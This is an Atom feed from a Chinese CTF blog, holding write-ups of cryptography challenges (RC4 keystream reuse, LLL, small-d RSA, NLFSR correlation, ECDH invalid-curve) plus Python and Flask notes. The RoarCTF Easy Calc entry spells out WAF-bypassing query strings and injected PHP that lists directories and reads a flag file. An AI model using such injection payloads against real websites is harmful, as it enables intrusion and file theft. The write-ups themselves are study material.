<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>从零开始的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zrax-x.github.io/"/>
  <updated>2020-06-06T07:10:38.522Z</updated>
  <id>https://zrax-x.github.io/</id>
  
  <author>
    <name>zraxx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安恒五月赛BJD&amp;DAS</title>
    <link href="https://zrax-x.github.io/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&amp;DAS/"/>
    <id>https://zrax-x.github.io/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&amp;DAS/</id>
    <published>2020-05-26T07:00:00.000Z</published>
    <updated>2020-06-06T07:10:38.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Encrypt-Img"><a href="#Encrypt-Img" class="headerlink" title="Encrypt_Img"></a>Encrypt_Img</h2><p>题目本身不难，比赛时没有注意到两次加密的是同一张图片，所以没有做出来。</p><p>做法比较简单，因为两个plaintext长度不等（这里是相差一个字节）。因此通过异或plaintext1和ciphertext1的最后一个字节我们可以得到RC4此时产生key，而两次加密时RC4所产生的密钥流显然是一样的，因此可以用这个key去解出图片的第一个像素点，记为p1。同时我们知道两张图片是相同的，因此通过p1和第一次加密的图片的第一个像素点，我们又可以拿到下一个key，用它来解密第二次加密时的第二个像素点，以此类推，最终解出整张图片。</p><p>赛后简单的写了下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author : zraxx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line"></span><br><span class="line">enc1_file = Image.open(<span class="string">r"enc1.png"</span>)</span><br><span class="line">enc2_file = Image.open(<span class="string">r"enc2.png"</span>)</span><br><span class="line">img1 = array(enc1_file)</span><br><span class="line">img2 = array(enc2_file)</span><br><span class="line">a, b, _ = img1.shape</span><br><span class="line">ciphertext1 = <span class="number">12078640933356268898100798377710191641</span></span><br><span class="line">m = ord(<span class="string">'g'</span>)</span><br><span class="line">c = int(hex(ciphertext1).strip(<span class="string">'L'</span>)[<span class="number">-2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel2 = img2[x, y]</span><br><span class="line">        pixel1 = img1[x, y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            k = (c ^ m)</span><br><span class="line">            c = pixel2[i] <span class="comment"># get ciphertext of img2</span></span><br><span class="line">            pixel2[i] = pixel2[i] ^ k  </span><br><span class="line">            m = pixel2[i] <span class="comment"># get plaintext of img2 and img1</span></span><br><span class="line">            c = pixel1[i] <span class="comment"># get ciphertext of img1</span></span><br><span class="line">        img2[x][y] = pixel2</span><br><span class="line">enc = Image.fromarray(img2)</span><br><span class="line">enc.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><h2 id="backpacker"><a href="#backpacker" class="headerlink" title="backpacker"></a>backpacker</h2><p>这是一个利用LLL的攻击，比赛时还没有接触过这类题目，所以没有解出来。之后在网上搜索资料看到相关的攻击方法，记录一下。</p><p><img src="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&DAS/1591426710827.png" alt="theory"></p><p>按文中给出的方法构造矩阵，然后求LLL，对其中的行向量（只包含-1或1）进行处理（-1转为0），即得到了我们的明文。</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;Encrypt-Img&quot;&gt;&lt;a href=&quot;#Encrypt-Img&quot; class=&quot;headerlink&quot;
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="密码学" scheme="https://zrax-x.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF[2020]-easyRSA</title>
    <link href="https://zrax-x.github.io/2020/05/11/De1CTF[2020]-easyRSA/"/>
    <id>https://zrax-x.github.io/2020/05/11/De1CTF[2020]-easyRSA/</id>
    <published>2020-05-11T07:00:00.000Z</published>
    <updated>2020-05-13T08:00:28.303Z</updated>
    
    <content type="html"><![CDATA[<p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genE</span><span class="params">(lcm,limit)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">        d = gmpy2.next_prime(r)</span><br><span class="line">        e = gmpy2.invert(d,lcm)</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">lcm = gmpy2.lcm(p<span class="number">-1</span>,q<span class="number">-1</span>)</span><br><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e1 = genE(lcm,limit)</span><br><span class="line">e2 = genE(lcm,limit)</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,phi)</span><br><span class="line">d2 = gmpy2.invert(e2,phi)</span><br><span class="line"></span><br><span class="line">e = [e1,e2]</span><br><span class="line">plain = bytes_to_long(flag)</span><br><span class="line">cipher = pow(plain,e[random.getrandbits(<span class="number">1</span>)],n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'N:'</span> + str(n))</span><br><span class="line">print(<span class="string">'e1:'</span> + str(e1))</span><br><span class="line">print(<span class="string">'e2:'</span> + str(e2))</span><br><span class="line">print(<span class="string">'cipher:'</span> + str(cipher))</span><br></pre></td></tr></table></figure><p>用n计算了两对e，d，其中d都比较小</p><p>这里需要参考这篇论文<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf" target="_blank" rel="noopener">https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf</a> </p><p>论文的结论就是给出多对e,d，其中$d&lt;N^α$，就可以分解N</p><p>这里当给出2对e，d时需要满足$d&lt;N^{5/14}$，观察题目就可以发现满足该不等式。</p><p>因此我们构造矩阵</p><p>$B = \begin{bmatrix}1 &amp; -N &amp; 0 &amp; N^2 \\  &amp; e_1 &amp; - e_1 &amp; -e_1N\\ &amp; &amp; e_2 &amp; -e_2N \\ &amp; &amp; &amp; e_1e_2\end{bmatrix}$</p><p>$D = \begin{bmatrix}N &amp;  &amp;  &amp;  \\  &amp;  N^{(1/2)} &amp; &amp; \\ &amp; &amp; N^{1+\delta_2} &amp;  \\ &amp; &amp; &amp; 1\end{bmatrix}$</p><p>$L=B*D$</p><p>同时需要求解的向量$v = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))$</p><p>之后对$L$求$LLL$，记为$L_2$</p><p>于是$v = L_2[0]*L^{-1}$</p><p>之后便可得到$\Phi(N)=e_1*v[1]/v[0]​$，进而求得明文</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="密码学" scheme="https://zrax-x.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="RSA" scheme="https://zrax-x.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF[2020]-NLFSR</title>
    <link href="https://zrax-x.github.io/2020/05/11/De1CTF[2020]-NLFSR/"/>
    <id>https://zrax-x.github.io/2020/05/11/De1CTF[2020]-NLFSR/</id>
    <published>2020-05-11T07:00:00.000Z</published>
    <updated>2020-05-11T05:23:38.994Z</updated>
    
    <content type="html"><![CDATA[<p>首先看一下题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> a, b, c, d, flag</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">"De1CTF&#123;"</span> + <span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]) + <span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">assert</span> [len(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]] == [<span class="number">19</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> a, b, c, d</span><br><span class="line">    a = lfsr(a, ma)</span><br><span class="line">    b = lfsr(b, mb)</span><br><span class="line">    c = lfsr(c, mc)</span><br><span class="line">    d = lfsr(d, md)</span><br><span class="line">    [ao, bo, co, do] = [i &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">    <span class="keyword">return</span> (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">(nb)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">        s += str(combine())</span><br><span class="line">    open(<span class="string">"data"</span>, <span class="string">"w+"</span>).write(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">genkey(<span class="number">128</span>*<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p>可以看出这个属于非线性组合生成器 </p><p>可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/nfsr-zh/" target="_blank" rel="noopener">CTF-WIKI</a>关于相关攻击的介绍</p><p>回到本题目中，我们可以用脚本测试一下有哪些相关性，这里我们可以观察到有三组相关性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">suma = <span class="number">0</span></span><br><span class="line">sumb = <span class="number">0</span></span><br><span class="line">sumc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> do <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">o = (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line">suma += ao==o</span><br><span class="line">sumb += (<span class="number">1</span>-(ao^bo))==o</span><br><span class="line">sumc += (co^do)==o</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> suma*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumb*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumc*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>因此我们可以首先恢复出a，然后根据a恢复出b，同时c，d也能直接恢复</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;首先看一下题目源码&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span
        
      
    
    </summary>
    
    
    
      <category term="密码学" scheme="https://zrax-x.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="LFSR" scheme="https://zrax-x.github.io/tags/LFSR/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF[2020]-ECDH</title>
    <link href="https://zrax-x.github.io/2020/05/11/De1CTF[2020]-ECDH/"/>
    <id>https://zrax-x.github.io/2020/05/11/De1CTF[2020]-ECDH/</id>
    <published>2020-05-11T07:00:00.000Z</published>
    <updated>2020-05-13T08:00:13.775Z</updated>
    
    <content type="html"><![CDATA[<p>定位到题目源码中最关键的部分——密钥交换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">r = zero</span><br><span class="line">tmp = p</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">        r = add(r,tmp)</span><br><span class="line">    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">key = (x,y)</span><br><span class="line">result = mul(self.secret,key)</span><br><span class="line">self.key = self.pointToKeys(result)</span><br><span class="line">self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure><p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p><p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p><p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;定位到题目源码中最关键的部分——密钥交换&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="密码学" scheme="https://zrax-x.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="ECDH" scheme="https://zrax-x.github.io/tags/ECDH/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF[2019]-Easy Calc</title>
    <link href="https://zrax-x.github.io/2020/05/07/RoarCTF[2019]-Easy%20Calc/"/>
    <id>https://zrax-x.github.io/2020/05/07/RoarCTF[2019]-Easy%20Calc/</id>
    <published>2020-05-07T07:00:00.000Z</published>
    <updated>2020-05-13T08:01:17.520Z</updated>
    
    <content type="html"><![CDATA[<p>知识点：<strong>PHP的字符串解析特性</strong></p><p>参考文章：<a href="https://www.freebuf.com/column/207936.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207936.html</a> </p><p>PHP会将URL或body中的查询字符串关联到<code>$_GET</code>或<code>$_POST</code>。例如：<code>/?foo=bar</code>代表<code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。如果一个IDS/IPS或WAF中有一条规则是当<code>news_id</code>参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;news.php?%20news[id%00&#x3D;42&quot;+AND+1&#x3D;0--</span><br></pre></td></tr></table></figure><p>上述PHP语句的参数<code>%20news[id%00</code>的值将存储到$_GET[“news_id”]中。 </p><p>有了这个知识，我们就可以绕过waf了。</p><p>同时，我们需要了解几个php的函数</p><ul><li>scandir($dir) , 列出dir下的所有文件和目录，默认升序，如要降序，则用scandir($dir, 1)</li><li>file_get_contents($file)，获取file的内容</li><li>var_dump($var)，输出变量的相关信息 </li></ul><p>ok，然后就是实操</p><p>第一步，获取目录下的所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>找到文件flagg</p><p>第二步，获取文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>成功拿到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;知识点：&lt;strong&gt;PHP的字符串解析特性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://www.freebuf.com/column/207936.html&quot; target=&quot;_blank&quot;
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="WEB" scheme="https://zrax-x.github.io/tags/WEB/"/>
    
      <category term="PHP" scheme="https://zrax-x.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>python2基于socket.socket类实现类似pwntools的交互方法</title>
    <link href="https://zrax-x.github.io/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/"/>
    <id>https://zrax-x.github.io/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/</id>
    <published>2020-05-06T07:00:00.000Z</published>
    <updated>2020-05-06T11:22:22.728Z</updated>
    
    <content type="html"><![CDATA[<p>作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。</p><p>由于我的电脑是window系统，没能成功装上pwntools库，因此要用pwntools就需要开虚拟机，本人比较懒，就自己重新基于socket.socket类重新写了一个类，以实现类似pwntools中的交互方法。</p><p>具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">12233</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysocket</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, myhost, myport)</span>:</span></span><br><span class="line">self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">self.client.connect((myhost, myport))</span><br><span class="line">self.fd = self.client.makefile(<span class="string">'rw'</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(self, delim = <span class="string">"\n"</span>)</span>:</span></span><br><span class="line">buf = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> buf.endswith(delim):</span><br><span class="line">buf += self.fd.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> buf.strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, data)</span>:</span></span><br><span class="line">self.fd.write(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendline</span><span class="params">(self, data)</span>:</span></span><br><span class="line">self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendlineafter</span><span class="params">(self, data, delim = <span class="string">"\n"</span>, debug = False)</span>:</span></span><br><span class="line">buf = self.recvuntil(delim)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"><span class="keyword">print</span> buf.strip()</span><br><span class="line">self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">self.client.close()</span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>后续将根据实际情况继续扩展</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。&lt;/p&gt;
&lt;p&gt;由于我的电脑是window系统，没能成功装上pwntool
        
      
    
    </summary>
    
    
    
      <category term="socket" scheme="https://zrax-x.github.io/tags/socket/"/>
    
      <category term="python" scheme="https://zrax-x.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Flask框架学习1</title>
    <link href="https://zrax-x.github.io/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/"/>
    <id>https://zrax-x.github.io/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/</id>
    <published>2020-05-05T07:00:00.000Z</published>
    <updated>2020-05-05T14:13:40.876Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h3><p>默认情况下，Flask路由响应<strong>GET</strong>请求。但是，可以通过为<strong>route()</strong>装饰器提供方法参数来更改此首选项 </p><p>如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/login',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      user = request.form[<span class="string">'nm'</span>]</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      user = request.args.get(<span class="string">'nm'</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br></pre></td></tr></table></figure><h3 id="Flask-模板"><a href="#Flask-模板" class="headerlink" title="Flask 模板"></a>Flask 模板</h3><p>可以以HTML的形式返回绑定到某个URL的函数的输出</p><p>相关函数: <strong>render_template()</strong></p><p>Flask将尝试在templates文件夹中找到HTML文件，而templates文件夹与脚本处于同级目录。 </p><p>术语<strong>‘web templating system（web模板系统）’</strong>指的是设计一个HTML脚本，其中可以动态插入变量数据。web模板系统包括模板引擎，某种数据源和模板处理器。 </p><p>例如，以下为hello.html中的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span 